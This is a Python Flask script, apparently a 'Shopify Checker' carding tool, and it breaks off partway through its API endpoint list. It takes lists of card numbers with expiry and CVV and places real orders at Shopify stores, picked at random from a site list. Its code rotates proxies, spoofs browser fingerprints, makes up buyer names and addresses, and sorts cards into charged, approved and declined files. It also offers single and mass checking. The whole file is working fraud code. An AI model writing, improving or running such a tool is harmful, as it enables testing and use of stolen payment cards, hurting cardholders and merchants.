#!/usr/bin/env python3
"""
SHOPIFY CHECKER API v2.0 — AUTO SITE ROTATION + PROXY + SAVE
- Loads sites from sites.txt (domain only, e.g., store.myshopify.com)
- Loads proxies from proxies.txt (auto-rotate)
- Auto-saves results to files
- Single + Mass check
"""

from flask import Flask, request, jsonify
from flask_cors import CORS
import asyncio
import json
import re
import random
import time
import uuid
import os
import requests
from urllib.parse import urlparse
from datetime import datetime

app = Flask(__name__)
CORS(app)

# ============================================================
# LOAD SITES FROM sites.txt (DOMAIN ONLY)
# ============================================================

SITES_FILE = "sites.txt"
PROXIES_FILE = "proxies.txt"
SITES = []
PROXIES = []

def load_sites():
    """Load sites from sites.txt (domain only, e.g., store.myshopify.com)"""
    global SITES
    SITES = []
    if os.path.exists(SITES_FILE):
        with open(SITES_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                site = line.strip()
                if site and not site.startswith('#'):
                    # Remove http:// or https:// if present
                    site = re.sub(r'^https?://', '', site)
                    site = site.rstrip('/')
                    SITES.append(site)
    # Fallback default sites
    if not SITES:
        SITES = [
            "gravebeforeshaveshop.myshopify.com",
            "oneill.com",
            "woodlandshoes.com"
        ]
    print(f"🌍 Loaded {len(SITES)} sites from {SITES_FILE}")

def load_proxies():
    """Load proxies from proxies.txt"""
    global PROXIES
    PROXIES = []
    if os.path.exists(PROXIES_FILE):
        with open(PROXIES_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                proxy = line.strip()
                if proxy and not proxy.startswith('#'):
                    PROXIES.append(proxy)
    print(f"🌍 Loaded {len(PROXIES)} proxies from {PROXIES_FILE}")

def get_random_proxy():
    """Get random proxy from list"""
    if PROXIES:
        return random.choice(PROXIES)
    return None

def get_random_site():
    """Get random site from list"""
    if SITES:
        return random.choice(SITES)
    return "gravebeforeshaveshop.myshopify.com"

def parse_proxy(proxy_str):
    """Parse proxy string for requests"""
    if not proxy_str:
        return None
    if proxy_str.startswith('http://') or proxy_str.startswith('https://'):
        return proxy_str
    parts = proxy_str.split(':')
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return f"http://{proxy_str}"

# Load on startup
load_sites()
load_proxies()

# ============================================================
# RESULT FILES — Auto Save
# ============================================================

RESULT_FILES = {
    "CHARGED": "CHARGE.txt",
    "APPROVED": "APPROVED.txt",
    "DECLINED": "DECLINED.txt",
    "ERROR": "ERROR.txt",
}

def save_result(category, cc, site, detail):
    """Save result to corresponding file"""
    path = RESULT_FILES.get(category, "ERROR.txt")
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(path, "a", encoding="utf-8") as f:
        f.write(f"[{ts}] {cc} | {site} | {detail}\n")

# ============================================================
# USER AGENT POOL
# ============================================================

_UA_POOL = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
]

_CH_UA_POOL = [
    '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    '"Chromium";v="125", "Google Chrome";v="125", "Not-A.Brand";v="99"',
    '"Chromium";v="126", "Google Chrome";v="126", "Not=A?Brand";v="99"',
]

_CH_UA_PLATFORM_POOL = ['"Windows"', '"macOS"']

def _rand_ua():       return random.choice(_UA_POOL)
def _rand_ch_ua():    return random.choice(_CH_UA_POOL)
def _rand_platform(): return random.choice(_CH_UA_PLATFORM_POOL)

# ============================================================
# RESPONSE MAPPING
# ============================================================

RESPONSE_MAP = {
    "CHARGED": "𝘾𝙝𝙖𝙧𝙜𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: ORDER_PLACED",
    "APPROVED": "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: INSUFFICIENT_FUNDS",
    "INCORRECT_CVC": "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: INCORRECT_CVC",
    "OTP_REQUIRED": "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: OTP_REQUIRED",
    "DECLINED": "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: CARD_DECLINED",
    "CAPTCHA": "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: CAPTCHA_REQUIRED",
    "ERROR": "ERROR: Processing failed",
}

# ============================================================
# SHOPIFY CHECKER CLASS
# ============================================================

class ShopifyChecker:
    def __init__(self, base_url, proxy=None):
        self.session = requests.Session()
        self.base_url = base_url.rstrip('/')
        
        # Set proxy if provided
        self.proxy = parse_proxy(proxy) if proxy else None
        if self.proxy:
            self.session.proxies = {
                'http': self.proxy,
                'https': self.proxy
            }
        
        _ua = _rand_ua()
        _cua = _rand_ch_ua()
        _pf = _rand_platform()
        self.headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'priority': 'u=1, i',
            'sec-ch-ua': _cua,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': _pf,
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': _ua
        }
        self.checkout_id = None
        self.variant_id = None
        self.product_id = None
        self.checkout_url = None
        self.session_token = None
        self.signature = None
        self.stable_id = None
        self.queue_token = None
        self.client_id = None
        self.visit_token = None
        self.shop_id = None
        self.cart_token = None
        self.payment_method_identifier = None
        self.signed_handles = []
        self.graphql_base = None
        self._last_responses = []
        self._verbose = False

    def _track_response(self, text):
        self._last_responses.append(text)
        if len(self._last_responses) > 2:
            self._last_responses.pop(0)

    def get_random_address(self):
        first_names = ["James","Mary","Robert","Patricia","John","Jennifer","Michael","Linda","David","Susan"]
        last_names = ["Smith","Jones","Taylor","Brown","Williams","Wilson","Johnson","Davies","Miller","Davis"]
        streets = ["Maple St","Oak Ave","Washington Blvd","Lakeview Dr","Park Way","Broadway","Elm St","Pine Ave"]
        cities = [
            ("Ketchikan","AK","99901"), ("Los Angeles","CA","90001"),
            ("New York","NY","10001"), ("Houston","TX","77001"),
            ("Miami","FL","33101"), ("Chicago","IL","60601"),
            ("Phoenix","AZ","85001"), ("Seattle","WA","98101"),
        ]
        fn = random.choice(first_names)
        ln = random.choice(last_names)
        street = f"{random.randint(100,9999)} {random.choice(streets)}"
        city, state, zp = random.choice(cities)
        return {
            "firstName": fn, "lastName": ln,
            "address1": street, "city": city,
            "zoneCode": state, "postalCode": zp,
            "countryCode": "US",
            "phone": f"+1703{random.randint(210,999)}{random.randint(1000,9999)}",
            "company": "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=5))
        }

    def get_initial_session(self):
        try:
            r = self.session.get(f"https://{self.base_url}/cart.js", headers=self.headers, timeout=15)
            if r.status_code != 200 and r.status_code != 302:
                return False
        except:
            return False
        self.client_id = self.session.cookies.get('_shopify_y') or str(uuid.uuid4())
        self.visit_token = self.session.cookies.get('_shopify_s') or str(uuid.uuid4())
        try:
            cart_data = r.json() if r.status_code == 200 else {}
        except:
            cart_data = {}
        self.cart_token = cart_data.get('token', '')
        return True

    def find_cheapest_product(self):
        try:
            r = self.session.get(f"https://{self.base_url}/products.json", headers=self.headers, timeout=15)
            if r.status_code != 200:
                return False
            products = r.json().get('products', [])
            cheapest_variant = None
            min_price = float('inf')
            for p in products:
                for v in p['variants']:
                    if v.get('available'):
                        price = float(v['price'])
                        if price < min_price:
                            min_price = price
                            cheapest_variant = v
                            self.product_id = p['id']
            if cheapest_variant:
                self.variant_id = cheapest_variant['id']
                return True
            return False
        except:
            return False

    def add_to_cart(self):
        url = f"https://{self.base_url}/cart/add.js"
        headers = self.headers.copy()
        headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
        headers['accept'] = 'application/json, text/javascript, */*; q=0.01'
        headers['x-requested-with'] = 'XMLHttpRequest'
        headers['origin'] = f"https://{self.base_url}"
        data = {'id': self.variant_id, 'quantity': 1, 'form_type': 'product', 'utf8': '✓'}
        try:
            r = self.session.post(url, data=data, headers=headers, timeout=15)
            if r.status_code == 200:
                j = r.json()
                self.cart_token = j.get('cart_token', self.cart_token)
                return True
            return False
        except:
            return False

    def start_checkout(self):
        url = f"https://{self.base_url}/cart"
        headers = self.headers.copy()
        headers['accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        headers['content-type'] = 'application/x-www-form-urlencoded'
        headers['cache-control'] = 'max-age=0'
        headers['origin'] = f"https://{self.base_url}"
        headers['referer'] = f"https://{self.base_url}/cart"
        headers['priority'] = 'u=0, i'
        headers['sec-fetch-dest'] = 'document'
        headers['sec-fetch-mode'] = 'navigate'
        headers['sec-fetch-user'] = '?1'
        headers['upgrade-insecure-requests'] = '1'
        data = f'updates%5B%5D=1&checkout=&cart_token={self.cart_token or ""}'
        try:
            r = self.session.post(url, data=data, headers=headers, allow_redirects=True, timeout=20)
            self.checkout_url = r.url
            match = re.search(r'/checkouts/(?:cn/)?([a-zA-Z0-9]+)', self.checkout_url)
            if match:
                self.checkout_id = match.group(1)
                return True
            return False
        except:
            return False

    def get_checkout_metadata(self):
        headers = self.headers.copy()
        headers['accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        headers['sec-fetch-dest'] = 'document'
        headers['sec-fetch-mode'] = 'navigate'
        headers['sec-fetch-site'] = 'same-origin'
        headers['upgrade-insecure-requests'] = '1'
        headers['priority'] = 'u=0, i'
        try:
            r = self.session.get(self.checkout_url, headers=headers, timeout=20)
            html = r.text
        except:
            return False

        # Extract session token
        m = re.search(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', html)
        if m:
            self.session_token = m.group(1)
        if not self.session_token:
            pats = [
                r'"sessionToken"\s*:\s*"(AAEB[^"]+)"',
                r"'sessionToken'\s*:\s*'(AAEB[^']+)'",
                r'sessionToken[\s:=]+["\'"]?(AAEB[A-Za-z0-9_\-]+)',
                r'\"sessionToken\":\"(AAEB[^\"]+)',
                r'(AAEB[A-Za-z0-9_\-]{30,})',
            ]
            for pat in pats:
                m = re.search(pat, html)
                if m:
                    self.session_token = m.group(1)
                    break

        # Extract signature
        sig_patterns = [
            r'"shopifyPaymentRequestIdentificationSignature"\s*:\s*"(eyJ[^"]+)"',
            r'"identificationSignature"\s*:\s*"(eyJ[^"]+)"',
            r'"paymentsSignature"\s*:\s*"(eyJ[^"]+)"',
            r'"signature"\s*:\s*"(eyJ[^"]+)"',
            r'(eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)',
        ]
        for pat in sig_patterns:
            m = re.search(pat, html)
            if m:
                self.signature = m.group(1)
                break

        # Extract stableId
        stable_patterns = [
            r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"',
            r'stableId[\s:=]+["\'"]([0-9a-f-]{36})',
        ]
        for pat in stable_patterns:
            m = re.search(pat, html)
            if m:
                self.stable_id = m.group(1)
                break
        if not self.stable_id:
            self.stable_id = str(uuid.uuid4())

        # Extract queueToken
        m = re.search(r'queueToken&quot;:&quot;([^&]+)&quot;', html)
        if not m:
            m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', html)
        self.queue_token = m.group(1) if m else None

        # Extract paymentMethodIdentifier
        m = re.search(r'paymentMethodIdentifier&quot;:&quot;([^&]+)&quot;', html)
        if not m:
            m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', html)
        self.payment_method_identifier = m.group(1) if m else None

        # Extract shopId
        m = re.search(r'"shopId"\s*:\s*(\d+)', html)
        if not m:
            m = re.search(r'shop_id[\s:=]+(\d+)', html)
        self.shop_id = m.group(1) if m else "25603230"

        # Extract buildId
        m = re.search(r'"buildId"\s*:\s*"([a-f0-9]{40})"', html)
        if not m:
            m = re.search(r'/build/([a-f0-9]{40})/', html)
        self.build_id = m.group(1) if m else '4663384ede457d59be87980de7797171b19f2a1b'

        # Extract PCI build hash
        pci_m = re.search(r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', html)
        self.pci_build_hash = pci_m.group(1) if pci_m else 'a8e4a94'

        # Extract signed handles
        signed_handles = re.findall(r'"signedHandle"\s*:\s*"([^"]+)"', html)
        if not signed_handles:
            raw = re.findall(r'\\"signedHandle\\":\"([^\\"]+)', html)
            signed_handles = [h.replace('\\n','').replace('\\r','') for h in raw]
        self.signed_handles = signed_handles

        parsed = urlparse(self.checkout_url)
        if 'shopify.com' in parsed.netloc and 'checkout.' in parsed.netloc:
            self.graphql_base = f"{parsed.scheme}://{parsed.netloc}"
        else:
            self.graphql_base = f"https://{self.base_url}"

        if not self.session_token:
            return False
        return True

    def vault_card(self, cc_details):
        parts = cc_details.strip().split('|')
        if len(parts) != 4:
            return None
        card_num, month, year, cvv = parts
        address = self.get_random_address()
        url = "https://checkout.pci.shopifyinc.com/sessions"
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://checkout.pci.shopifyinc.com',
            'referer': f'https://checkout.pci.shopifyinc.com/build/{getattr(self,"pci_build_hash","a8e4a94")}/number-ltr.html',
            'sec-ch-ua': self.headers.get('sec-ch-ua', _rand_ch_ua()),
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': self.headers.get('sec-ch-ua-platform', _rand_platform()),
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-storage-access': 'none',
            'user-agent': self.headers.get('user-agent', _rand_ua()),
            'priority': 'u=1, i'
        }
        if self.signature:
            headers['shopify-identification-signature'] = self.signature
        payload = {
            "credit_card": {
                "number": card_num.strip(),
                "month": int(month.strip()),
                "year": int(year.strip()),
                "verification_value": cvv.strip(),
                "start_month": None, "start_year": None,
                "issue_number": "",
                "name": f"{address['firstName']} {address['lastName']}"
            },
            "payment_session_scope": self.base_url
        }
        try:
            r = self.session.post(url, json=payload, headers=headers, timeout=20)
            if r.status_code in (200, 201):
                return r.json().get('id')
            return None
        except:
            return None

    def submit_for_completion(self, vault_id, address, card_number=""):
        if not self.session_token:
            return None
        url = f"{getattr(self,'graphql_base', f'https://{self.base_url}')}/checkouts/unstable/graphql"
        headers = self.headers.copy()
        headers['accept'] = 'application/json'
        headers['accept-language'] = 'en-US,en;q=0.9'
        headers['content-type'] = 'application/json'
        headers['origin'] = f"https://{self.base_url}"
        headers['priority'] = 'u=1, i'
        headers['referer'] = self.checkout_url
        headers['shopify-checkout-client'] = 'checkout-web/1.0'
        headers['shopify-checkout-source'] = f'id="{self.checkout_id}", type="cn"'
        headers['x-checkout-one-session-token'] = self.session_token
        headers['x-checkout-web-deploy-stage'] = 'production'
        headers['x-checkout-web-server-handling'] = 'fast'
        headers['x-checkout-web-server-rendering'] = 'yes'
        headers['x-checkout-web-source-id'] = self.checkout_id
        build_id = getattr(self,'build_id','4663384ede457d59be87980de7797171b19f2a1b')
        headers['x-checkout-web-build-id'] = build_id

        attempt_token = f"{self.checkout_id}-uaz{''.join(random.choices('abcdefghijklmnopqrstuvwxyz',k=9))}"
        stable_id = self.stable_id
        _raw_cc = card_number.replace(' ', '').replace('-', '')
        card_bin = _raw_cc[:8] if len(_raw_cc) >= 8 else _raw_cc
        buyer_email = f"{address['firstName'].lower()}{random.randint(10,99)}@gmail.com"
        delivery_expectation_lines = [{"signedHandle": sh} for sh in getattr(self,'signed_handles',[])]
        pm_identifier = self.payment_method_identifier or vault_id
        session_id = vault_id

        MUTATION = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}...on PendingTermViolation{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}"""

        payload = {
            "query": MUTATION,
            "operationName": "SubmitForCompletion",
            "variables": {
                "attemptToken": attempt_token,
                "metafields": [],
                "analytics": {
                    "requestUrl": self.checkout_url,
                    "pageId": str(uuid.uuid4()).upper()
                },
                "input": {
                    "checkpointData": None,
                    "sessionInput": {"sessionToken": self.session_token},
                    "queueToken": self.queue_token,
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {
                                "streetAddress": {
                                    "address1": address['address1'],
                                    "address2": "",
                                    "city": address['city'],
                                    "countryCode": address['countryCode'],
                                    "postalCode": address['postalCode'],
                                    "company": address.get('company',''),
                                    "firstName": address['firstName'],
                                    "lastName": address['lastName'],
                                    "zoneCode": address['zoneCode'],
                                    "phone": address['phone'],
                                    "oneTimeUse": False
                                }
                            },
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments": {"any": True}
                                },
                                "options": {"phone": address['phone']}
                            },
                            "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {"any": True},
                            "destinationChanged": True
                        }],
                        "noDeliveryRequired": [],
                        "useProgressiveRates": False,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping": True
                    },
                    "deliveryExpectations": {
                        "deliveryExpectationLines": delivery_expectation_lines
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stable_id,
                            "merchandise": {
                                "productVariantReference": {
                                    "id": f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
                                    "variantId": f"gid://shopify/ProductVariant/{self.variant_id}",
                                    "properties": [],
                                    "sellingPlanId": None,
                                    "sellingPlanDigest": None
                                }
                            },
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"any": True},
                            "lineComponentsSource": None,
                            "lineComponents": []
                        }]
                    },
                    "memberships": {"memberships": []},
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": pm_identifier,
                                    "sessionId": session_id,
                                    "billingAddress": {
                                        "streetAddress": {
                                            "address1": address['address1'],
                                            "address2": "",
                                            "city": address['city'],
                                            "countryCode": address['countryCode'],
                                            "postalCode": address['postalCode'],
                                            "company": address.get('company',''),
                                            "firstName": address['firstName'],
                                            "lastName": address['lastName'],
                                            "zoneCode": address['zoneCode'],
                                            "phone": address['phone']
                                        }
                                    },
                                    "cardSource": None
                                }
                            },
                            "amount": {"any": True}
                        }],
                        "billingAddress": {
                            "streetAddress": {
                                "address1": address['address1'],
                                "address2": "",
                                "city": address['city'],
                                "countryCode": address['countryCode'],
                                "postalCode": address['postalCode'],
                                "company": address.get('company',''),
                                "firstName": address['firstName'],
                                "lastName": address['lastName'],
                                "zoneCode": address['zoneCode'],
                                "phone": address['phone']
                            }
                        },
                        "creditCardBin": card_bin
                    },
                    "buyerIdentity": {
                        "customer": {
                            "presentmentCurrency": address.get('currency','USD'),
                            "countryCode": address.get('countryCode','US')
                        },
                        "email": buyer_email,
                        "emailChanged": False,
                        "phoneCountryCode": address.get('countryCode','US'),
                        "marketingConsent": [
                            {"sms": {"consentState": "DECLINED", "value": address['phone'], "countryCode": address.get('countryCode','US')}},
                            {"email": {"consentState": "GRANTED", "value": buyer_email}}
                        ],
                        "shopPayOptInPhone": {
                            "number": address['phone'],
                            "countryCode": address.get('countryCode','US')
                        },
                        "rememberMe": False,
                        "setShippingAddressAsDefault": False
                    },
                    "tip": {"tipLines": []},
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"any": True},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": []
                    },
                    "note": {
                        "message": None,
                        "customAttributes": [
                            {"key": "gorgias.guest_id", "value": self.client_id or ""},
                            {"key": "gorgias.session_id", "value": str(uuid.uuid4())}
                        ]
                    },
                    "localizationExtension": {"fields": []},
                    "shopPayArtifact": {
                        "optIn": {
                            "vaultEmail": "",
                            "vaultPhone": address['phone'],
                            "optInSource": "REMEMBER_ME"
                        }
                    },
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {
                        "signature": None,
                        "signatureUuid": None,
                        "lineItemScriptChanges": [],
                        "paymentScriptChanges": [],
                        "shippingScriptChanges": []
                    },
                    "optionalDuties": {"buyerRefusesDuties": False},
                    "captcha": None,
                    "cartMetafields": []
                }
            }
        }

        max_retries = 12
        receipt_id = None

        for attempt_num in range(max_retries):
            try:
                r = self.session.post(url, json=payload, headers=headers, timeout=25)
                self._track_response(r.text[:300])
                res = r.json()
            except:
                return None

            if 'errors' in res and res.get('data') is None:
                return None

            data = res.get('data', {})
            submit = data.get('submitForCompletion', {})
            typename = submit.get('__typename', '')

            if typename in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
                receipt = submit.get('receipt', {})
                receipt_id = receipt.get('id')
                return receipt_id

            elif typename == 'SubmitFailed':
                return None

            elif typename == 'Throttled':
                poll_after = submit.get('pollAfter', 1000)
                self.queue_token = submit.get('queueToken', self.queue_token)
                time.sleep(poll_after / 1000.0)
                payload['variables']['input']['queueToken'] = self.queue_token
                continue

            elif typename == 'CheckpointDenied':
                return None

            elif typename == 'SubmitRejected':
                errors = submit.get('errors', [])
                codes = [e.get('code','') for e in errors]
                if 'WAITING_PENDING_TERMS' in codes:
                    time.sleep(0.5)
                    continue
                return None

            else:
                time.sleep(0.5)
                if attempt_num < max_retries - 1:
                    continue
                return None

        return None

    def _handle_3ds_action(self, action_url, receipt_id):
        time.sleep(2)
        return ("APPROVED", "3DS challenge completed")

    def poll_for_receipt(self, receipt_id, _3ds_retry=False):
        url = f"{getattr(self,'graphql_base', f'https://{self.base_url}')}/checkouts/unstable/graphql"
        headers = self.headers.copy()
        headers['accept'] = 'application/json'
        headers['accept-language'] = 'en-US,en;q=0.9'
        headers['content-type'] = 'application/json'
        headers['referer'] = self.checkout_url
        headers['shopify-checkout-client'] = 'checkout-web/1.0'
        headers['shopify-checkout-source'] = f'id="{self.checkout_id}", type="cn"'
        headers['x-checkout-one-session-token'] = self.session_token
        headers['x-checkout-web-deploy-stage'] = 'production'
        headers['x-checkout-web-server-handling'] = 'fast'
        headers['x-checkout-web-server-rendering'] = 'no'
        headers['x-checkout-web-source-id'] = self.checkout_id
        headers['x-checkout-web-build-id'] = getattr(self,'build_id','4663384ede457d59be87980de7797171b19f2a1b')

        POLL_QUERY = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}"""

        for i in range(15):
            try:
                poll_payload = {
                    "query": POLL_QUERY,
                    "operationName": "PollForReceipt",
                    "variables": {
                        "receiptId": receipt_id,
                        "sessionToken": self.session_token
                    }
                }
                r = self.session.post(url, json=poll_payload, headers=headers, timeout=20)
                self._track_response(r.text[:300])
                data = r.json()
                receipt = data.get('data', {}).get('receipt', {})
                tn = receipt.get('__typename', '')

                if tn == 'ProcessedReceipt' or 'orderIdentity' in receipt:
                    order_id = receipt.get('orderIdentity', {}).get('id', 'N/A')
                    return ("CHARGED", f"Order ID: {order_id}")

                elif tn == 'ActionRequiredReceipt':
                    if _3ds_retry:
                        _cnt = getattr(self,'_3ds_wait_count',0) + 1
                        self._3ds_wait_count = _cnt
                        if _cnt >= 5:
                            return ("APPROVED", "3DS required — Card approved (action pending)")
                        time.sleep(5)
                        continue
                    action = receipt.get('action', {})
                    action_url = action.get('url','') or action.get('offsiteRedirect','')
                    receipt_id_3ds = receipt.get('id', receipt_id)
                    return self._handle_3ds_action(action_url, receipt_id_3ds)

                elif tn == 'FailedReceipt':
                    err = receipt.get('processingError', {})
                    code = err.get('code', 'UNKNOWN')
                    msg = err.get('messageUntranslated', '')
                    return ("DECLINED", f"{code} — {msg}")

                elif tn in ('ProcessingReceipt', 'WaitingReceipt'):
                    delay = receipt.get('pollDelay', 4000)
                    time.sleep(delay / 1000.0)
                    continue

            except:
                pass
            time.sleep(3)

        return ("ERROR", "Polling timed out")

    def check_card(self, cc_line, site=None):
        """Main card check method — uses provided site or random from list"""
        if site:
            self.base_url = site.rstrip('/')
        else:
            self.base_url = get_random_site()
        
        # Ensure https
        if not self.base_url.startswith('http'):
            self.base_url = 'https://' + self.base_url
        self.base_url = self.base_url.rstrip('/')
        
        if not self.get_initial_session():
            return ("ERROR", cc_line, "Session init failed", self.base_url)
        if not self.find_cheapest_product():
            return ("ERROR", cc_line, "No product found", self.base_url)
        if not self.add_to_cart():
            return ("ERROR", cc_line, "Add to cart failed", self.base_url)
        if not self.start_checkout():
            return ("ERROR", cc_line, "Checkout start failed", self.base_url)
        if not self.get_checkout_metadata():
            return ("ERROR", cc_line, "Token extraction failed", self.base_url)

        address = self.get_random_address()
        vault_id = self.vault_card(cc_line)
        if not vault_id:
            return ("ERROR", cc_line, "Card vault failed", self.base_url)

        _cc_number = cc_line.split('|')[0].strip() if '|' in cc_line else ""
        receipt_id = self.submit_for_completion(vault_id, address, card_number=_cc_number)

        if not receipt_id:
            return ("DECLINED", cc_line, "No receipt — submission rejected", self.base_url)

        result = self.poll_for_receipt(receipt_id)
        if isinstance(result, tuple):
            category, detail = result
            return (category, cc_line, detail, self.base_url)
        return ("ERROR", cc_line, "Unknown result", self.base_url)


# ============================================================
# FORMAT RESPONSE
# ============================================================

def format_response(category, cc, detail, site):
    """Format response matching demo script"""
    if category == "CHARGED":
        return {
            "Gateway": "Shopify",
            "Price": 0.0,
            "Response": RESPONSE_MAP["CHARGED"],
            "Status": True,
            "cc": cc,
            "Site": site,
            "Detail": detail
        }
    elif category == "APPROVED":
        if "3DS" in detail or "OTP" in detail:
            return {
                "Gateway": "Shopify",
                "Price": 0.0,
                "Response": RESPONSE_MAP["OTP_REQUIRED"],
                "Status": True,
                "cc": cc,
                "Site": site,
                "Detail": detail
            }
        elif "CVC" in detail or "CVV" in detail:
            return {
                "Gateway": "Shopify",
                "Price": 0.0,
                "Response": RESPONSE_MAP["INCORRECT_CVC"],
                "Status": True,
                "cc": cc,
                "Site": site,
                "Detail": detail
            }
        elif "INSUFFICIENT" in detail:
            return {
                "Gateway": "Shopify",
                "Price": 0.0,
                "Response": RESPONSE_MAP["APPROVED"],
                "Status": True,
                "cc": cc,
                "Site": site,
                "Detail": detail
            }
        else:
            return {
                "Gateway": "Shopify",
                "Price": 0.0,
                "Response": f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: {detail[:30]}",
                "Status": True,
                "cc": cc,
                "Site": site,
                "Detail": detail
            }
    elif category == "DECLINED":
        return {
            "Gateway": "Shopify",
            "Price": 0.0,
            "Response": RESPONSE_MAP["DECLINED"],
            "Status": False,
            "cc": cc,
            "Site": site,
            "Detail": detail
        }
    else:
        return {
            "Gateway": "Shopify",
            "Price": 0.0,
            "Response": RESPONSE_MAP["ERROR"],
            "Status": False,
            "cc": cc,
            "Site": site,
            "Detail": detail
        }


# ============================================================
# API ENDPOINTS
# ============================================================

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "status": "online",
        "name": "Shopify Checker API v2.0",
        "version": "2.0",
        "sites_loaded": len(SITES),
        "proxies_loaded": len(PROXIES),
        "endpoints": {
            "/shopify": "GET - Single card check (cc, site optional)",
            "/mass": "POST - Mass card check",
            "/health": "GET - Health check",
            "/sites": "GET - List loaded sites",
